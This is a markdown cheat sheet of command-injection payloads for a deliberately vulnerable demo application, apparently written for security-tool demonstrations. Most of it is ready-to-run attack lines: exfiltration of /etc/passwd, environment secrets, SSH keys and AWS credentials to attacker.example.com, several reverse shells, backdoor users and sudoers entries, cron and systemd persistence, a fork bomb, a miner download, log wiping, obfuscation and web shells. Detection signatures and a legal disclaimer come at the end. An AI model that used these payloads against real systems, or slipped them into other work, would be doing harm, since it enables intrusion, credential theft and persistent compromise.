# Command Injection Exploit Payloads

Quick reference for demonstration payloads to use with the AAR Management System vulnerability.

## Vulnerability Location
- **File**: `handlers/aar_report.go`
- **Line**: ~47
- **Field**: Operation Name (user-controlled input)
- **Function**: `GenerateReportHandler`

## Basic Payload Structure

```
Operation Name'; [MALICIOUS_COMMAND]; echo 'Suffix
```

The payload breaks out of the `wkhtmltopdf --title '...'` command by:
1. `'` - Closes the title string
2. `;` - Ends the wkhtmltopdf command
3. `[COMMAND]` - Executes arbitrary command
4. `;` - Separates from next command
5. `echo 'Suffix` - Completes the original title string (prevents errors)

---

## Payload Categories

### 1. Information Disclosure

#### Whoami - Get Current User
```
Test Op'; whoami > /tmp/pwned.txt; echo 'Complete
```

#### Hostname - Get Server Name
```
Test Op'; hostname > /tmp/hostname.txt; echo 'Complete
```

#### Environment Variables - Get Secrets
```
Test Op'; env > /tmp/secrets.txt; echo 'Complete
```

#### File System Enumeration
```
Test Op'; ls -la /etc > /tmp/filesystem.txt; echo 'Complete
```

---

### 2. Data Exfiltration (Requires Network Access)

#### DNS Exfiltration (Stealthy)
```
Test Op'; nslookup $(whoami).attacker.example.com; echo 'Complete
```

#### HTTP Exfiltration - Username
```
Test Op'; curl http://attacker.example.com/exfil?user=$(whoami); echo 'Complete
```

#### HTTP Exfiltration - Hostname & User
```
Test Op'; curl http://attacker.example.com/data?host=$(hostname)\&user=$(whoami); echo 'Complete
```

#### POST Data Exfiltration - /etc/passwd
```
Test Op'; curl -X POST -d @/etc/passwd http://attacker.example.com/collect; echo 'Complete
```

#### Base64 Encoded Exfiltration (Bypass Filtering)
```
Test Op'; cat /etc/passwd | base64 | curl -d @- http://attacker.example.com/b64; echo 'Complete
```

#### S3 Credentials Exfiltration
```
Test Op'; env | grep S3 | curl -d @- http://attacker.example.com/s3creds; echo 'Complete
```

---

### 3. Reverse Shells

#### Bash Reverse Shell (Linux)
```
Test Op'; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; echo 'Complete
```

#### Netcat Reverse Shell (If nc available)
```
Test Op'; nc -e /bin/bash 10.0.0.1 4444; echo 'Complete
```

#### Python Reverse Shell (If Python available)
```
Test Op'; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'; echo 'Complete
```

#### Persistent Reverse Shell (Cron)
```
Test Op'; (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -; echo 'Complete
```

---

### 4. Privilege Escalation

#### Create Backdoor User
```
Test Op'; useradd -m -p $(openssl passwd -1 P@ssw0rd) backdoor; echo 'Complete
```

#### Add User to Sudoers
```
Test Op'; echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/backdoor; echo 'Complete
```

#### SUID Binary Creation (If root)
```
Test Op'; cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash; echo 'Complete
```

---

### 5. Persistence Mechanisms

#### SSH Key Installation
```
Test Op'; mkdir -p ~/.ssh && echo "ssh-rsa AAAA[...public key...]" >> ~/.ssh/authorized_keys; echo 'Complete
```

#### Systemd Service Persistence (Requires privileges)
```
Test Op'; echo "[Unit]
Description=Update Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/backdoor.service && systemctl enable backdoor.service; echo 'Complete
```

#### Cron-based Persistence
```
Test Op'; (crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -; echo 'Complete
```

---

### 6. Lateral Movement

#### Network Scanning (Internal Recon)
```
Test Op'; for i in {1..254}; do ping -c 1 192.168.1.$i > /dev/null && echo "192.168.1.$i is up" >> /tmp/scan.txt; done; echo 'Complete
```

#### SSH Key Harvesting
```
Test Op'; find /home -name id_rsa -o -name id_dsa 2>/dev/null | xargs cat | curl -d @- http://attacker.example.com/keys; echo 'Complete
```

#### AWS Metadata Service Query (If in AWS)
```
Test Op'; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ | xargs -I {} curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{} | curl -d @- http://attacker.example.com/aws; echo 'Complete
```

---

### 7. Denial of Service

#### Resource Exhaustion - CPU
```
Test Op'; while true; do :; done & echo 'Complete
```

#### Resource Exhaustion - Disk
```
Test Op'; dd if=/dev/zero of=/tmp/fill bs=1M count=10000; echo 'Complete
```

#### Process Bomb (Fork Bomb)
```
Test Op'; :(){ :|:& };:; echo 'Complete
```

---

### 8. Cryptomining

#### Download and Run Miner
```
Test Op'; curl -o /tmp/miner http://attacker.example.com/xmrig && chmod +x /tmp/miner && /tmp/miner -o pool.minexmr.com:4444 -u [wallet]; echo 'Complete
```

---

### 9. Defense Evasion

#### Clear Logs
```
Test Op'; echo "" > /var/log/syslog; echo "" > /var/log/auth.log; history -c; echo 'Complete
```

#### Timestamp Manipulation
```
Test Op'; touch -t 202001010000 /tmp/backdoor; echo 'Complete
```

---

## Demo-Friendly Payloads

### For Live Demos (Low Risk)

#### 1. Simple File Creation (Safe)
```
Test Op'; touch /tmp/demo_was_here_$(date +%s).txt; echo 'Complete
```

#### 2. Localhost HTTP Request (Safe)
```
Test Op'; curl http://localhost:8080/ > /dev/null; echo 'Complete
```

#### 3. DNS Lookup to Controlled Domain (Safe)
```
Test Op'; nslookup demo.example.com; echo 'Complete
```

#### 4. Echo to Temp File (Safe)
```
Test Op'; echo "Vulnerability Demonstrated" > /tmp/demo_$(whoami).txt; echo 'Complete
```

---

## Pre-Populated Payload (Already in System)

### AAR-20251107-0003 - Operation Phantom Strike

**Operation Name**:
```
Operation Phantom Strike'; curl http://attacker.example.com/exfil?data=$(whoami); echo 'Complete
```

This payload is already loaded in the system and ready for demonstration.

---

## Setting Up Attack Listener

### HTTP Listener (Netcat)
```bash
# Terminal 1: Start listener
nc -lvp 8000

# Terminal 2: Create AAR with payload
Operation Name: Test Op'; curl http://localhost:8000/pwned?user=$(whoami); echo 'Complete

# Click "Generate PDF Report"
# Terminal 1 will show incoming connection
```

### HTTP Listener (Python)
```bash
# Terminal 1: Start HTTP server with logging
python3 -c "import http.server; http.server.HTTPServer(('', 8000), http.server.SimpleHTTPRequestHandler).serve_forever()"

# Terminal 2: Create AAR with payload
Operation Name: Test Op'; curl http://localhost:8000/exfil?data=$(whoami); echo 'Complete

# Terminal 1 will show GET request with exfiltrated data
```

### DNS Listener (dnslog/Burp Collaborator)
```bash
# Use a DNS logging service like dnslog.cn or Burp Collaborator

Operation Name: Test Op'; nslookup $(whoami).YOUR_SUBDOMAIN.dnslog.cn; echo 'Complete

# Check DNS log service for incoming queries with username
```

---

## Obfuscation Techniques

### Base64 Encoding
```
Test Op'; echo "Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tCg==" | base64 -d | bash; echo 'Complete
```
Decodes to: `curl http://attacker.com`

### Hex Encoding
```
Test Op'; echo -e "\x63\x75\x72\x6c" http://attacker.com; echo 'Complete
```

### Environment Variable Substitution
```
Test Op'; $SHELL -c "curl http://attacker.com"; echo 'Complete
```

---

## Payload Testing Checklist

Before demo:
- [ ] Test payload syntax in a safe environment
- [ ] Ensure attacker server/listener is running
- [ ] Verify network connectivity (if using remote server)
- [ ] Have backup payload ready
- [ ] Test with runtime protection disabled first
- [ ] Test with runtime protection enabled second
- [ ] Clear any test artifacts from /tmp

---

## Impact Matrix

| Payload Type | Impact | Detection Difficulty | Demo Suitability |
|--------------|--------|---------------------|------------------|
| File Creation | Low | Easy | ✅ Excellent |
| Info Disclosure | Medium | Medium | ✅ Good |
| HTTP Exfiltration | High | Medium | ✅ Excellent |
| DNS Exfiltration | High | Hard | ✅ Good |
| Reverse Shell | Critical | Easy | ⚠️ Use with caution |
| Persistence | Critical | Hard | ❌ Not recommended |
| Privilege Escalation | Critical | Medium | ❌ Not recommended |

---

## Defense Detection Signatures

What runtime protection looks for:

1. **Process Chain Anomalies**
   - `wkhtmltopdf` → `sh` → `curl` (unexpected)
   - `wkhtmltopdf` → `bash` → network activity (suspicious)

2. **Network Behavior**
   - Unexpected outbound connections from wkhtmltopdf
   - DNS queries with unusual subdomains
   - HTTP requests from non-browser processes

3. **File System Activity**
   - Writes to unexpected locations (/tmp, /etc)
   - Reading sensitive files (/etc/passwd, /etc/shadow)
   - SSH key modifications

4. **Execution Patterns**
   - Shell spawned by non-interactive process
   - Command line contains shell metacharacters from user input
   - Process ancestry violates expected patterns

---

### 10. Web Shells (Remote Command Execution via HTTP)

#### PHP Web Shell (If PHP installed)
```
Test Op'; echo "<?php system(\$_GET[\'cmd\']); ?>" > /var/www/html/shell.php; echo 'Complete
```
Access: `http://target-server/shell.php?cmd=whoami`

#### Go-based Web Shell (Using existing Go environment)
```
Test Op'; echo "package main; import (\"fmt\"; \"net/http\"; \"os/exec\"); func handler(w http.ResponseWriter, r *http.Request) { cmd := r.URL.Query().Get(\"cmd\"); if cmd != \"\" { out, _ := exec.Command(\"sh\", \"-c\", cmd).Output(); fmt.Fprintf(w, \"%s\", out) } else { fmt.Fprintf(w, \"Usage: ?cmd=command\") } }; func main() { http.HandleFunc(\"/\", handler); http.ListenAndServe(\":9999\", nil) }" > /tmp/webshell.go && cd /tmp && go run webshell.go &; echo 'Complete
```
Access: `http://target-server:9999/?cmd=whoami`

#### Python Web Shell (If Python available)
```
Test Op' || echo "import http.server,socketserver,urllib.parse,subprocess
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if '?cmd=' in self.path:
            cmd=urllib.parse.unquote(self.path.split('?cmd=')[1])
            result=subprocess.run(cmd,shell=True,capture_output=True,text=True)
            output = result.stdout + result.stderr
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', str(len(output.encode())))
            self.end_headers()
            self.wfile.write(output.encode())
            return
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        body = b'<html><body><h1>Command Shell</h1><p>Usage: ?cmd=command</p></body></html>'
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
httpd=socketserver.TCPServer(('',27374),Handler)
httpd.serve_forever()" > /tmp/webshell.py && python3 /tmp/webshell.py & echo 'Complete
```
Access: `http://target-server:27374/?cmd=whoami`

#### Simple HTTP Command Executor (Using netcat)
```
Test Op'; while true; do echo -e "HTTP/1.1 200 OK\n\n\$(bash -c \"\$(echo \$REQUEST_URI | cut -d= -f2 | python3 -c \"import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))\")\")" | nc -l -p 8888 -q 1; done &; echo 'Complete
```
Access: `http://target-server:8888/?cmd=whoami`

**Web Shell Advantages:**
- Firewall friendly (uses standard HTTP ports)
- Browser accessible (no special tools needed) 
- Persistent access until process killed
- Stealthy (looks like normal web traffic)
- Great for demos (visually clear, works through corporate firewalls)

---

## Legal and Ethical Notes

⚠️ **WARNING**: These payloads are for authorized security testing only.

- Only use in controlled, isolated environments
- Only use on systems you own or have explicit permission to test
- Do not use these payloads against production systems without approval
- Do not use these payloads for malicious purposes
- Unauthorized access to computer systems is illegal (CFAA, GDPR, etc.)

This demo application is designed for security demonstrations. Use responsibly.

---

**For more information, see the main README.md and DEMO_SCRIPT.md**
